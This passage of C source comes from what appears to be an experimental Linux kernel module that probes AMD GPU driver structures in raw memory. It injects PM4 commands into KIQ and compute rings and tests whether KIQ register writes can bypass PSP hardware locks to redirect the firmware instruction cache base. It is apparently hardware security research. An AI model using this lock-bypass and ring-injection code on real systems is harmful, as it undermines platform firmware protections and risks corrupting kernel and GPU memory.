						if (v >= 0x8000000000ULL && v <= 0xA000000000ULL) t = " VRAM";
						if ((v & 0xFFFFFFFF00000000ULL) == 0) t = " u32";
						pr_info("fw36:   [0x%X] = 0x%016llX%s\n", i, v, t);
					}
					interesting++;
				}
			}
			pr_info("fw36:   (%d non-zero entries)\n", interesting);
		}
	}

	/* ===========================================
	 * APPROACH F: amdgpu_ring struct reverse engineer
	 *
	 * Search for the ring->ring (cpu pointer to ring buffer)
	 * and ring->wptr. In amdgpu, ring->wptr is a u64 that
	 * tracks the software write pointer in dwords.
	 *
	 * The struct has a characteristic pattern:
	 *   ring->ring = kptr to ring buffer
	 *   ring->ring_size = power of 2
	 *   ring->wptr = current position
	 *   ring->gpu_addr = GART address
	 *   ring->doorbell_index = small integer
	 *
	 * We scan for kptr + GART pairs and then look for
	 * wptr/rptr values nearby.
	 * =========================================== */
	pr_info("fw36: === APPROACH F: RING STRUCT FIELDS ===\n");
	{
		/* Known ring candidates from mode 17:
		 * adev+0xFD98, 0x10AD8, 0x10D30, 0x14B68, 0x3B900, 0x3B958 */
		struct { int off; const char *name; } rings[] = {
			{0xFD98,  "compute0"},
			{0x10AD8, "compute1"},
			{0x10D30, "compute2"},
			{0x14B68, "compute3"},
			{0x16AD8, "kiq"},
			{0x3B900, "psp_ring0"},
			{0x3B958, "psp_ring1"},
		};
		int r;

		for (r = 0; r < (int)(sizeof(rings) / sizeof(rings[0])); r++) {
			int base = rings[r].off;
			u64 kptr;

			/* Check if there's a valid kptr here */
			kptr = *(u64 *)((u8 *)adev + base);
			if ((kptr >> 48) != 0xFFFF || kptr == 0xFFFFFFFFFFFFFFFFULL)
				continue;

			pr_info("fw36: Ring '%s' at adev+0x%X:\n", rings[r].name, base);

			/* Scan the struct for interesting fields */
			{
				int f;
				u64 found_gpu = 0, found_wptr = 0;
				u32 found_size = 0;
				int gpu_off = -1, size_off = -1, wptr_off = -1;

				for (f = -64; f < 256; f += 8) {
					int foff = base + f;
					if (foff < 0 || foff >= 0x80000) continue;

					u64 fv = *(u64 *)((u8 *)adev + foff);

					/* GPU addr */
					if (!found_gpu && fv >= 0x7FFF00000000ULL &&
					    fv <= 0x7FFF20000000ULL && (fv & 0xFFF) == 0) {
						found_gpu = fv;
						gpu_off = f;
					}

					/* Small u32 that could be ring_size (power of 2) */
					if (!found_size && (fv & 0xFFFFFFFF00000000ULL) == 0) {
						u32 lo = (u32)fv;
						if (lo >= 0x100 && lo <= 0x200000 &&
						    (lo & (lo - 1)) == 0) {
							found_size = lo;
							size_off = f;
						}
					}

					/* Wptr candidates: small values that look like ring positions */
					if (!found_wptr && fv < 0x100000 && fv > 0) {
						found_wptr = fv;
						wptr_off = f;
					}
				}

				if (found_gpu)
					pr_info("fw36:   gpu_addr = 0x%llX (at +%d)\n", found_gpu, gpu_off);
				if (found_size)
					pr_info("fw36:   ring_size = 0x%X (%d KB) (at +%d)\n",
						found_size, found_size / 1024, size_off);
				if (found_wptr)
					pr_info("fw36:   wptr_cand = 0x%llX (at +%d)\n", found_wptr, wptr_off);

				/* Now read the actual ring buffer content if kptr valid */
				if (virt_addr_valid((void *)kptr)) {
					u32 *buf = (u32 *)(void *)kptr;
					int i, nz = 0;
					for (i = 0; i < 256; i++)
						if (buf[i]) nz++;
					pr_info("fw36:   ring_buf[0..1KB] nz=%d first8: %08X %08X %08X %08X %08X %08X %08X %08X\n",
						nz, buf[0], buf[1], buf[2], buf[3],
						buf[4], buf[5], buf[6], buf[7]);

					/* If this is KIQ, try reading deeper for dispatch info */
					if (r == 4) { /* kiq */
						int mq = 0;
						int rsize = found_size ? found_size : 1024;
						for (i = 0; i < rsize / 4 && i < 4096; i++) {
							u32 dw = buf[i];
							if ((dw >> 30) == 3) { /* PM4 type 3 */
								u32 op = (dw >> 8) & 0xFF;
								u32 cnt = (dw & 0x3FFF) + 1;
								if (op == 0x31 || op == 0x32 || op == 0x37 ||
								    op == 0x49) {
									pr_info("fw36:   KIQ PM4[0x%X]: op=0x%02X(%s) cnt=%d: ",
										i*4, op,
										op==0x31 ? "MAP_Q" :
										op==0x32 ? "WRITE_DATA" :
										op==0x37 ? "UNMAP_Q" :
										"SET_RES", cnt);
									{
										int j;
										for (j = 0; j <= (int)cnt && j < 12; j++)
											pr_cont("%08X ", buf[i+j]);
									}
									pr_cont("\n");
									mq++;
								}
							}
						}
						pr_info("fw36:   KIQ had %d interesting PM4 packets\n", mq);
					}
				}
			}
		}
	}

	/* ===========================================
	 * APPROACH G: MM_INDEX write to MDBASE
	 *
	 * Mode 17 approach B showed that MM_INDEX with
	 * 32-bit mask of MDBASE (0xD68E0000) returns
	 * high-entropy VRAM data.
	 *
	 * This means MM_INDEX CAN access some memory region
	 * at that address. Try WRITING through MM_INDEX to
	 * confirm R/W access to whatever is at that offset.
	 * =========================================== */
	pr_info("fw36: === APPROACH G: MM_INDEX MDBASE WRITE TEST ===\n");
	{
		u32 mdbase_lo = 0xD68E0000;  /* 32-bit mask of MDBASE */
		u32 orig_val;
		u32 canary = 0xFEE1DEAD;
		u32 readback;

		/* Read original */
		writel(mdbase_lo | 0x80000000, mmio + 0x0000 * 4); /* MM_INDEX */
		writel(0, mmio + 0x0006 * 4); /* MM_INDEX_HI = 0 for 32-bit */
		orig_val = readl(mmio + 0x0001 * 4); /* MM_DATA */
		pr_info("fw36: MM_INDEX(0x%08X) orig = 0x%08X\n", mdbase_lo, orig_val);

		/* Write canary through MM_DATA */
		writel(mdbase_lo | 0x80000000, mmio + 0x0000 * 4);
		writel(0, mmio + 0x0006 * 4);
		writel(canary, mmio + 0x0001 * 4);
		udelay(10);

		/* Read back */
		writel(mdbase_lo | 0x80000000, mmio + 0x0000 * 4);
		writel(0, mmio + 0x0006 * 4);
		readback = readl(mmio + 0x0001 * 4);
		pr_info("fw36: MM_INDEX(0x%08X) wrote=0x%08X readback=0x%08X %s\n",
			mdbase_lo, canary, readback,
			readback == canary ? "*** WRITABLE ***" : "NOT WRITABLE");

		/* If writable, this is a VRAM region at offset 0xD68E0000.
		 * Restore original value. */
		if (readback == canary) {
			writel(mdbase_lo | 0x80000000, mmio + 0x0000 * 4);
			writel(0, mmio + 0x0006 * 4);
			writel(orig_val, mmio + 0x0001 * 4);
			pr_info("fw36: Restored original value\n");

			/* If writable, scan for dispatch table patterns in
			 * this VRAM region */
			pr_info("fw36: === Scanning VRAM at 0x%X for dispatch table ===\n",
				mdbase_lo);
			{
				int i;
				int seq_len = 0;
				u32 seq_hi = 0;
				int seq_start = 0;

				for (i = 0; i < 4096; i++) {
					u32 addr = mdbase_lo + i * 4;
					u32 val;
					writel(addr | 0x80000000, mmio + 0x0000 * 4);
					writel(0, mmio + 0x0006 * 4);
					val = readl(mmio + 0x0001 * 4);

					/* Look for sequences of similar upper-16-bit values */
					if ((val >> 16) == seq_hi && seq_hi != 0 && seq_hi != 0xFFFF) {
						seq_len++;
					} else {
						if (seq_len >= 8) {
							int j;
							pr_info("fw36: Potential dispatch table at VRAM 0x%X, "
								"%d entries with hi=0x%04X:\n",
								mdbase_lo + seq_start * 4, seq_len + 1, seq_hi);
							for (j = seq_start; j <= seq_start + seq_len && j < 4096; j++) {
								u32 a2 = mdbase_lo + j * 4;
								u32 v2;
								writel(a2 | 0x80000000, mmio + 0x0000 * 4);
								writel(0, mmio + 0x0006 * 4);
								v2 = readl(mmio + 0x0001 * 4);
								if (j < seq_start + 16)
									pr_info("fw36:   [%d] = 0x%08X\n",
										j - seq_start, v2);
							}
						}
						seq_start = i;
						seq_len = 0;
					}
					seq_hi = val >> 16;
				}
			}
		}

		/* Also try with full 48-bit MDBASE address via MM_INDEX_HI */
		{
			u64 full_mdbase = 0x3B73D68E0000ULL;
			u32 addr_lo = (u32)(full_mdbase | 0x80000000ULL);
			u32 addr_hi = (u32)(full_mdbase >> 31);

			writel(addr_lo, mmio + 0x0000 * 4);
			writel(addr_hi, mmio + 0x0006 * 4);
			orig_val = readl(mmio + 0x0001 * 4);
			pr_info("fw36: MM_INDEX(0x%llX) full48 = 0x%08X\n",
				full_mdbase, orig_val);

			if (orig_val != 0xFFFFFFFF) {
				/* Try write */
				writel(addr_lo, mmio + 0x0000 * 4);
				writel(addr_hi, mmio + 0x0006 * 4);
				writel(canary, mmio + 0x0001 * 4);
				udelay(10);

				writel(addr_lo, mmio + 0x0000 * 4);
				writel(addr_hi, mmio + 0x0006 * 4);
				readback = readl(mmio + 0x0001 * 4);
				pr_info("fw36: MM_INDEX(0x%llX) write=0x%08X readback=0x%08X %s\n",
					full_mdbase, canary, readback,
					readback == canary ? "*** WRITABLE ***" : "NOT WRITABLE");

				if (readback == canary) {
					writel(addr_lo, mmio + 0x0000 * 4);
					writel(addr_hi, mmio + 0x0006 * 4);
					writel(orig_val, mmio + 0x0001 * 4);
				}
			}
		}
	}

	/* ===========================================
	 * APPROACH H: Compute Queue Ring Injection
	 *
	 * Instead of KIQ (which requires understanding the
	 * doorbell), try injecting into a compute queue's
	 * ring buffer directly. Compute queues process
	 * PM4 packets just like KIQ.
	 *
	 * From approach B's queue map, find an active
	 * compute queue, locate its ring buffer via kptr,
	 * and write a WRITE_DATA PM4 packet after the
	 * current wptr.
	 *
	 * The goal: use WRITE_DATA to write to the GP
	 * registers or to a known GART address, proving
	 * we can execute arbitrary PM4 commands.
	 * =========================================== */
	pr_info("fw36: === APPROACH H: COMPUTE QUEUE DISCOVERY ===\n");
	{
		/* Search for amdgpu_ring structures by looking for the
		 * ring->funcs pointer. All compute rings share the same
		 * funcs pointer. Find it by looking for repeated kptrs
		 * at known offsets relative to ring buffers. */

		/* The GRBM approach from B already gave us active queues.
		 * Now correlate with adev ring structs. */

		/* In amdgpu, compute rings are at adev->gfx.compute_ring[]
		 * Search for pattern: multiple ring structs with sequential
		 * gpu_addrs */

		int off;
		u64 prev_gpu = 0;
		int seq_count = 0;
		int first_ring_off = 0;

		for (off = 0x10000; off < 0x18000; off += 8) {
			u64 v = *(u64 *)((u8 *)adev + off);
			if (v >= 0x7FFF00000000ULL && v <= 0x7FFF20000000ULL &&
			    (v & 0xFFF) == 0) {
				if (prev_gpu && v > prev_gpu && (v - prev_gpu) < 0x200000) {
					seq_count++;
					if (seq_count == 1) first_ring_off = off - 8;
				} else {
					seq_count = 0;
				}
				prev_gpu = v;
			}
		}

		if (seq_count >= 2) {
			pr_info("fw36: Found %d sequential GART addrs starting at adev+0x%X\n",
				seq_count + 1, first_ring_off);
		}

		/* Direct approach: scan for the compute ring array.
		 * Each ring struct is ~0x258 bytes (600 bytes).
		 * There are typically 8 compute rings.
		 * Look for 8 GART addrs spaced ~0x258 apart. */
		{
			int stride;
			for (stride = 0x200; stride <= 0x300; stride += 8) {
				int base_off;
				for (base_off = 0xF000; base_off < 0x16000; base_off += 8) {
					u64 g0 = *(u64 *)((u8 *)adev + base_off);
					u64 g1 = *(u64 *)((u8 *)adev + base_off + stride);
					u64 g2 = *(u64 *)((u8 *)adev + base_off + stride * 2);

					if (g0 >= 0x7FFF00000000ULL && g0 <= 0x7FFF20000000ULL &&
					    g1 >= 0x7FFF00000000ULL && g1 <= 0x7FFF20000000ULL &&
					    g2 >= 0x7FFF00000000ULL && g2 <= 0x7FFF20000000ULL &&
					    g1 > g0 && g2 > g1 &&
					    (g0 & 0xFFF) == 0 && (g1 & 0xFFF) == 0) {

						int valid_count = 0;
						int j;
						for (j = 0; j < 8; j++) {
							int coff = base_off + stride * j;
							if (coff < 0x80000) {
								u64 gj = *(u64 *)((u8 *)adev + coff);
								if (gj >= 0x7FFF00000000ULL &&
								    gj <= 0x7FFF20000000ULL)
									valid_count++;
							}
						}

						if (valid_count >= 4) {
							pr_info("fw36: Compute ring array? "
								"base=adev+0x%X stride=0x%X (%d valid GART addrs)\n",
								base_off, stride, valid_count);

							/* Dump first 4 ring GPU addrs and associated kptrs */
							for (j = 0; j < 4 && j < valid_count; j++) {
								int coff = base_off + stride * j;
								u64 gj = *(u64 *)((u8 *)adev + coff);
								/* Look for ring buffer kptr nearby */
								{
									int k;
									for (k = -64; k < 0; k += 8) {
										u64 kv = *(u64 *)((u8 *)adev + coff + k);
										if ((kv >> 48) == 0xFFFF &&
										    kv != 0xFFFFFFFFFFFFFFFFULL &&
										    virt_addr_valid((void *)kv)) {
											pr_info("fw36:   Ring[%d]: gpu=0x%llX "
												"kptr=0x%llX (at %+d)\n",
												j, gj, kv, k);
											break;
										}
									}
								}
							}
							goto found_compute_array;
						}
					}
				}
			}
			found_compute_array:
			(void)0;
		}
	}

	pr_info("fw36: === MODE 18 COMPLETE ===\n");
	pr_info("fw36: Final PC = 0x%04X (orig 0x%04X)\n",
		rr(regCP_MEC1_INSTR_PNTR), pc_orig);
	#undef GC0
}

/* =============================================================================
 * Mode 19: KIQ INJECT — Direct Ring Buffer PM4 Injection
 *
 * Using the amdgpu_ring structure reverse-engineered from kernel source:
 *
 * struct amdgpu_ring key fields:
 *   ring->ring          = u32* CPU pointer to ring buffer
 *   ring->gpu_addr      = u64 GPU address of ring buffer
 *   ring->ring_size     = unsigned (bytes)
 *   ring->buf_mask      = unsigned (ring_size/4 - 1)
 *   ring->wptr          = u64 software write pointer (in dwords)
 *   ring->wptr_cpu_addr = volatile u32* for GPU to read wptr
 *   ring->doorbell_index = u32 doorbell register index
 *   ring->me/pipe/queue = u32 identity
 *
 * Strategy:
 *   1. Find adev->gfx.kiq[0].ring via pattern matching on gpu_addr
 *   2. Find doorbell aperture via adev->doorbell.cpu_addr
 *   3. Write WRITE_DATA PM4 to a GP register (canary test)
 *   4. Ring the doorbell
 *   5. Check if GP register changed (proves PM4 execution)
 * ============================================================================= */
static void kiq_inject(void *psp, void *adev)
{
	u32 gc_base0;
	u32 pc_orig;

	pr_info("fw36: === MODE 19: KIQ INJECT (PM4 Ring Injection) ===\n");

	gc_base0 = find_gc_base0(adev);
	if (!gc_base0) { pr_info("fw36: gc_base0 FAIL\n"); return; }
	#define GC0(r) (gc_base0 + (r))

	pc_orig = rr(regCP_MEC1_INSTR_PNTR);
	pr_info("fw36: MEC PC = 0x%04X\n", pc_orig);

	/* ===========================================
	 * APPROACH A: Find KIQ ring struct in adev
	 *
	 * Mode 18 found KIQ at adev+0x16AD8 area with
	 * gpu_addr = 0x7FFF00649000 at +0x16AF0.
	 *
	 * The amdgpu_ring struct is large (~600 bytes).
	 * We need to find the exact field offsets by
	 * searching for known values.
	 * =========================================== */
	pr_info("fw36: === APPROACH A: KIQ RING STRUCT DISCOVERY ===\n");
	{
		/* Search for the KIQ gpu_addr = 0x7FFF00649000 in adev */
		u64 kiq_gpu_addr = 0x7FFF00649000ULL;
		int gpu_off = -1;
		int off;

		for (off = 0x16000; off < 0x1A000; off += 8) {
			u64 v = *(u64 *)((u8 *)adev + off);
			if (v == kiq_gpu_addr) {
				gpu_off = off;
				pr_info("fw36: KIQ gpu_addr found at adev+0x%X\n", off);
				break;
			}
		}

		if (gpu_off < 0) {
			/* Broader search */
			for (off = 0x10000; off < 0x50000; off += 8) {
				u64 v = *(u64 *)((u8 *)adev + off);
				if (v == kiq_gpu_addr) {
					gpu_off = off;
					pr_info("fw36: KIQ gpu_addr found at adev+0x%X (broad)\n", off);
					break;
				}
			}
		}

		if (gpu_off < 0) {
			pr_info("fw36: KIQ gpu_addr 0x%llX not found in adev\n", kiq_gpu_addr);
			goto skip_inject;
		}

		/* Now search the ring struct for critical fields.
		 * In struct amdgpu_ring, typical field order:
		 *   adev (ptr), funcs (ptr), fence_drv, sched, ring_obj,
		 *   ring (u32*), rptr_offs, rptr_gpu_addr, rptr_cpu_addr,
		 *   wptr (u64), wptr_old (u64), ring_size (u32), max_dw (u32),
		 *   count_dw (int), gpu_addr (u64), ptr_mask (u64), buf_mask (u32),
		 *   ...
		 *
		 * Since the struct is complex with embedded fence_drv and sched,
		 * let's search relative to gpu_addr for the other fields.
		 */

		{
			/* gpu_addr is at gpu_off. Search backwards for ring (u32* kptr)
			 * and wptr (small u64). Search forwards for buf_mask, me/pipe/queue. */
			int f;
			u64 ring_cpu = 0, ring_wptr = 0;
			u64 ring_ptr_mask = 0;
			u32 ring_buf_mask = 0, ring_size = 0;
			u32 ring_me = 0, ring_pipe = 0, ring_queue = 0;
			u32 ring_doorbell = 0;
			u64 ring_wptr_cpu = 0;
			int cpu_off = -1, wptr_off = -1, size_off = -1;
			int mask_off = -1, db_off = -1, me_off = -1;
			int wptr_cpu_off = -1;

			/* Scan around gpu_addr for struct fields */
			pr_info("fw36: === Scanning around gpu_addr (adev+0x%X) ===\n", gpu_off);

			/* Dump 512 bytes before and after gpu_addr */
			for (f = -256; f < 512; f += 8) {
				int foff = gpu_off + f;
				if (foff < 0 || foff >= 0x80000) continue;

				u64 fv = *(u64 *)((u8 *)adev + foff);

				if (fv == 0) continue;

				/* Classify the value */
				if ((fv >> 48) == 0xFFFF && fv != 0xFFFFFFFFFFFFFFFFULL) {
					pr_info("fw36:   [gpu+%d] = 0x%llX (kptr)\n", f, fv);

					/* Ring buffer CPU ptr: kptr with page-aligned address */
					if (!ring_cpu && (fv & 0xFFF) == 0 && f < 0) {
						ring_cpu = fv;
						cpu_off = f;
					}

					/* wptr_cpu_addr: kptr, after wptr */
					if (ring_wptr && !ring_wptr_cpu && f > wptr_off) {
						ring_wptr_cpu = fv;
						wptr_cpu_off = f;
					}
				} else if (fv == kiq_gpu_addr) {
					pr_info("fw36:   [gpu+%d] = 0x%llX (gpu_addr)\n", f, fv);
				} else if (fv == 0xFFFFFFFFFFFFFFFFULL) {
					pr_info("fw36:   [gpu+%d] = 0x%llX (ptr_mask?)\n", f, fv);
					ring_ptr_mask = fv;
					mask_off = f;
				} else if ((fv >> 32) == 0 && fv > 0) {
					u32 lo = (u32)fv;
					/* Small power-of-2: ring_size or buf_mask */
					if (lo >= 0x100 && lo <= 0x200000 &&
					    (lo & (lo - 1)) == 0 && !ring_size) {
						ring_size = lo;
						size_off = f;
						pr_info("fw36:   [gpu+%d] = 0x%X (ring_size?)\n", f, lo);
					}
					/* buf_mask = ring_size/4 - 1 (odd number) */
					if (ring_size && lo == (ring_size / 4 - 1) && !ring_buf_mask) {
						ring_buf_mask = lo;
						pr_info("fw36:   [gpu+%d] = 0x%X (buf_mask)\n", f, lo);
					}
					/* doorbell_index: small value < 0x1000 */
					if (lo < 0x1000 && lo > 0 && f > 0 && !ring_doorbell) {
						/* Save candidate, don't print yet */
					}
					/* wptr: very small value (0-ring_size) */
					if (lo < 0x10000 && !ring_wptr && f < 0) {
						ring_wptr = fv;
						wptr_off = f;
					}
				} else if (fv >= 0x7FFF00000000ULL && fv <= 0x7FFF20000000ULL) {
					pr_info("fw36:   [gpu+%d] = 0x%llX (GART addr)\n", f, fv);
				} else {
					/* Print if it has an interesting pattern */
					if (f >= -32 && f <= 64)
						pr_info("fw36:   [gpu+%d] = 0x%llX\n", f, fv);
				}
			}

			pr_info("fw36: Ring struct summary:\n");
			pr_info("fw36:   ring_cpu (buffer): 0x%llX (at gpu+%d)\n", ring_cpu, cpu_off);
			pr_info("fw36:   gpu_addr: 0x%llX (at gpu+0)\n", kiq_gpu_addr);
			pr_info("fw36:   ring_size: 0x%X (at gpu+%d)\n", ring_size, size_off);
			pr_info("fw36:   buf_mask: 0x%X\n", ring_buf_mask);
			pr_info("fw36:   wptr: 0x%llX (at gpu+%d)\n", ring_wptr, wptr_off);
			pr_info("fw36:   ptr_mask: 0x%llX (at gpu+%d)\n", ring_ptr_mask, mask_off);

			/* Now look specifically for me/pipe/queue fields.
			 * In gfx v11/v12, KIQ is me=1, pipe=0, queue=0.
			 * These are consecutive u32 fields. */
			for (f = 0; f < 512; f += 4) {
				int foff = gpu_off + f;
				if (foff + 12 >= 0x80000) continue;

				u32 v0 = *(u32 *)((u8 *)adev + foff);
				u32 v1 = *(u32 *)((u8 *)adev + foff + 4);
				u32 v2 = *(u32 *)((u8 *)adev + foff + 8);

				/* me=1, pipe=0, queue=0 pattern */
				if (v0 == 1 && v1 == 0 && v2 == 0) {
					pr_info("fw36:   me/pipe/queue (1/0/0) at gpu+%d\n", f);
					me_off = f;
					ring_me = 1;
					ring_pipe = 0;
					ring_queue = 0;
					break;
				}
			}

			/* Find doorbell_index.
			 * In gfx11, KIQ doorbell = adev->doorbell_index.kiq.
			 * The doorbell_index field is after mqd_size in the struct.
			 * Search for a small value (< 0x1000) near me/pipe/queue. */
			if (me_off > 0) {
				for (f = me_off + 12; f < me_off + 128; f += 4) {
					int foff = gpu_off + f;
					if (foff >= 0x80000) break;
					u32 v = *(u32 *)((u8 *)adev + foff);
					/* doorbell_index: typically 0x0-0x200 range */
					if (v >= 2 && v <= 0x400) {
						pr_info("fw36:   doorbell_index candidate: 0x%X at gpu+%d\n",
							v, f);
						if (!ring_doorbell) {
							ring_doorbell = v;
							db_off = f;
						}
					}
				}
			}

			/* Find use_doorbell (bool) right after doorbell_index */
			if (db_off > 0) {
				u32 use_db = *(u32 *)((u8 *)adev + gpu_off + db_off + 4);
				pr_info("fw36:   use_doorbell (at db+4): %d\n", use_db);
			}
		}
	}

	/* ===========================================
	 * APPROACH B: Find doorbell aperture in adev
	 *
	 * adev->doorbell.cpu_addr is a kernel mapping of
	 * the GPU doorbell BAR (BAR 2 typically).
	 * We need this to ring doorbells.
	 * =========================================== */
	pr_info("fw36: === APPROACH B: DOORBELL APERTURE ===\n");
	{
		/* Search adev for doorbell structure.
		 * adev->doorbell has:
		 *   cpu_addr (void __iomem *)
		 *   num_kernel_doorbells (u32)
		 *   gpu_addr (u64)
		 *
		 * The PCI BAR2 for doorbells is typically at a ioremap'd address.
		 * Look for a kptr + small count + GART-range pattern. */

		/* First: check PCI BAR 2 */
		u64 bar2_start = 0, bar2_len = 0;
		if (g_pdev) {
			bar2_start = pci_resource_start(g_pdev, 2);
			bar2_len = pci_resource_len(g_pdev, 2);
			pr_info("fw36: PCI BAR2: start=0x%llX len=0x%llX\n",
				bar2_start, bar2_len);
		}

		/* Search for ioremap'd BAR2 in adev.
		 * It will be a kptr that maps bar2_start. */
		{
			int off;
			int found_db = 0;

			for (off = 0; off < 0x10000; off += 8) {
				u64 v = *(u64 *)((u8 *)adev + off);
				u64 v2 = *(u64 *)((u8 *)adev + off + 8);

				/* Look for kptr followed by reasonable doorbell count */
				if ((v >> 48) == 0xFFFF && v != 0xFFFFFFFFFFFFFFFFULL) {
					u32 num = (u32)v2;

					/* num_kernel_doorbells: typically 256-8192 */
					if (num >= 64 && num <= 16384) {
						/* Check if next u64 after count looks like a size
						 * or another related field */
						pr_info("fw36: Doorbell candidate adev+0x%X: "
							"cpu_addr=0x%llX num_doorbells=%d\n",
							off, v, num);
						found_db++;
						if (found_db >= 6) break;
					}
				}
			}
		}

		/* Alternative: search for doorbell.gpu_addr pattern.
		 * Typically doorbell GPU addr is in a known range. */
		/* Also look for the struct drm_vma_offset_manager pattern
		 * which is part of the doorbell bo */

		/* More targeted: find the specific doorbell_index for KIQ.
		 * In gfx11, this is usually at a fixed offset.
		 * adev->doorbell_index is a struct with named doorbell slots:
		 *   .kiq = small value (0x0-0x100)
		 *   .mec_ring0 = kiq + 1
		 *   etc.
		 * Search for ascending sequence of small values (doorbell assignments) */
		pr_info("fw36: === Doorbell index assignments ===\n");
		{
			int off;
			for (off = 0; off < 0x2000; off += 4) {
				u32 v0 = *(u32 *)((u8 *)adev + off);
				u32 v1 = *(u32 *)((u8 *)adev + off + 4);
				u32 v2 = *(u32 *)((u8 *)adev + off + 8);
				u32 v3 = *(u32 *)((u8 *)adev + off + 12);
				u32 v4 = *(u32 *)((u8 *)adev + off + 16);
				u32 v5 = *(u32 *)((u8 *)adev + off + 20);

				/* Look for ascending sequence like 2,4,6,8,10,12
				 * (doorbell indices, each 2 apart for 64-bit doorbells) */
				if (v0 >= 2 && v0 <= 64 &&
				    v1 == v0 + 2 && v2 == v0 + 4 &&
				    v3 == v0 + 6 && v4 == v0 + 8 && v5 == v0 + 10) {
					pr_info("fw36: Doorbell index table at adev+0x%X: "
						"%d,%d,%d,%d,%d,%d\n",
						off, v0, v1, v2, v3, v4, v5);
					break;
				}
			}
		}
	}

	/* ===========================================
	 * APPROACH C: Use amdgpu_kiq_wreg via kallsyms
	 *
	 * Instead of manually constructing the ring submission,
	 * find and call the driver's own KIQ write function.
	 *
	 * amdgpu_kiq_wreg(adev, reg, val) writes a value to
	 * a register through the KIQ WRITE_DATA PM4 packet.
	 * This is the cleanest and safest approach.
	 * =========================================== */
	pr_info("fw36: === APPROACH C: DRIVER KIQ FUNCTIONS ===\n");
	{
		typedef void (*fn_kiq_wreg)(void *adev, u32 reg, u32 val);
		typedef u32  (*fn_kiq_rreg)(void *adev, u32 reg);
		fn_kiq_wreg p_kiq_wreg = NULL;
		fn_kiq_rreg p_kiq_rreg = NULL;

		/* Try to find amdgpu_kiq_wreg and amdgpu_kiq_rreg */
		p_kiq_wreg = (fn_kiq_wreg)klookup("amdgpu_kiq_wreg");
		p_kiq_rreg = (fn_kiq_rreg)klookup("amdgpu_kiq_rreg");

		pr_info("fw36: amdgpu_kiq_wreg = %pS\n", p_kiq_wreg);
		pr_info("fw36: amdgpu_kiq_rreg = %pS\n", p_kiq_rreg);

		if (p_kiq_rreg) {
			/* Test: read a known register through KIQ */
			u32 gp0 = p_kiq_rreg(adev, GC0(0x2960));
			pr_info("fw36: KIQ rreg GP[0x2960] = 0x%08X\n", gp0);
		}

		if (p_kiq_wreg) {
			/* Test: write canary to GP register through KIQ */
			u32 orig = rr(GC0(0x2972));
			pr_info("fw36: GP[0x2972] orig = 0x%08X\n", orig);

			p_kiq_wreg(adev, GC0(0x2972), 0xCAFEBABE);
			udelay(100);

			{
				u32 now = rr(GC0(0x2972));
				pr_info("fw36: GP[0x2972] after KIQ write = 0x%08X %s\n",
					now,
					now == 0xCAFEBABE ? "*** KIQ WRITE SUCCESS ***" :
					"(modified by firmware?)");
			}

			/* Restore */
			p_kiq_wreg(adev, GC0(0x2972), orig);
		}

		/* Also look for KIQ ring submission functions */
		{
			void *p;
			p = (void *)klookup("amdgpu_ring_alloc");
			pr_info("fw36: amdgpu_ring_alloc = %pS\n", p);
			p = (void *)klookup("amdgpu_ring_commit");
			pr_info("fw36: amdgpu_ring_commit = %pS\n", p);
			p = (void *)klookup("gfx_v12_0_kiq_map_queues");
			pr_info("fw36: gfx_v12_0_kiq_map_queues = %pS\n", p);
			p = (void *)klookup("gfx_v11_0_kiq_map_queues");
			pr_info("fw36: gfx_v11_0_kiq_map_queues = %pS\n", p);

			/* The kiq_pm4_funcs pointer table — this has all the
			 * packet construction functions */
			p = (void *)klookup("gfx_v12_0_kiq_pm4_funcs");
			pr_info("fw36: gfx_v12_0_kiq_pm4_funcs = %pS\n", p);
			p = (void *)klookup("gfx_v11_0_kiq_pm4_funcs");
			pr_info("fw36: gfx_v11_0_kiq_pm4_funcs = %pS\n", p);
		}
	}

	/* ===========================================
	 * APPROACH D: Direct ring write + doorbell
	 *
	 * If kallsyms doesn't find the functions,
	 * we manually construct the PM4 and ring the doorbell.
	 *
	 * PM4 WRITE_DATA format:
	 *   DW0: 0xC0033200 (type3, op=0x32, count=3)
	 *   DW1: control (0x00500000 = dst_sel=mem_mapped, wr_confirm=1)
	 *        dst_sel: 0=mem_mapped_reg, 1=mem_async, 5=mem_sync
	 *        bit 20: wr_confirm
	 *   DW2: dst_addr_lo (register offset / 4)
	 *   DW3: dst_addr_hi (0 for registers)
	 *   DW4: data
	 *
	 * PM4 NOP format:
	 *   DW0: 0xC0001000 (type3, op=0x10, count=0)
	 * =========================================== */
	pr_info("fw36: === APPROACH D: MANUAL PM4 CONSTRUCTION ===\n");
	{
		/* Find ring->ring (CPU buffer ptr) by looking near gpu_addr */
		int gpu_off = -1;
		int off;
		u64 kiq_gpu_addr = 0x7FFF00649000ULL;

		for (off = 0x16000; off < 0x1A000; off += 8) {
			u64 v = *(u64 *)((u8 *)adev + off);
			if (v == kiq_gpu_addr) {
				gpu_off = off;
				break;
			}
		}

		if (gpu_off >= 0) {
			/* Dump raw bytes around gpu_addr to manually identify fields.
			 * This is the definitive way to find the ring struct layout. */
			pr_info("fw36: Raw ring struct dump (hex words, gpu_addr at 0x%X):\n",
				gpu_off);

			{
				int i;
				for (i = -512; i < 256; i += 4) {
					int aoff = gpu_off + i;
					if (aoff < 0 || aoff >= 0x80000) continue;
					u32 v = *(u32 *)((u8 *)adev + aoff);
					if (v == 0) continue;

					/* Print every non-zero dword */
					pr_info("fw36:   [0x%05X/gpu%+d] = 0x%08X\n",
						aoff, i, v);
				}
			}
		}
	}

	/* ===========================================
	 * APPROACH E: KIQ wreg to PSP-locked registers
	 *
	 * Test if WRITE_DATA PM4 (via amdgpu_kiq_wreg)
	 * can bypass PSP hardware locks on IC_BASE.
	 *
	 * If PSP lock is enforced at the register level
	 * (not the access path), this will fail silently.
	 * If the lock only applies to host MMIO, this
	 * will succeed and we can redirect IC_BASE!
	 * =========================================== */
	pr_info("fw36: === APPROACH E: KIQ WRITE TO LOCKED REGISTERS ===\n");
	{
		typedef void (*fn_kiq_wreg)(void *adev, u32 reg, u32 val);
		typedef u32  (*fn_kiq_rreg)(void *adev, u32 reg);
		fn_kiq_wreg p_wreg = (fn_kiq_wreg)klookup("amdgpu_kiq_wreg");
		fn_kiq_rreg p_rreg = (fn_kiq_rreg)klookup("amdgpu_kiq_rreg");

		if (p_wreg && p_rreg) {
			u32 ic_lo_mmio_before, ic_lo_kiq, ic_hi_mmio, ic_cntl_mmio;

			/* Read IC_BASE via BOTH paths to compare */
			ic_lo_mmio_before = rr(regCP_CPC_IC_BASE_LO);
			ic_hi_mmio = rr(regCP_CPC_IC_BASE_HI);
			ic_cntl_mmio = rr(regCP_CPC_IC_BASE_CNTL);
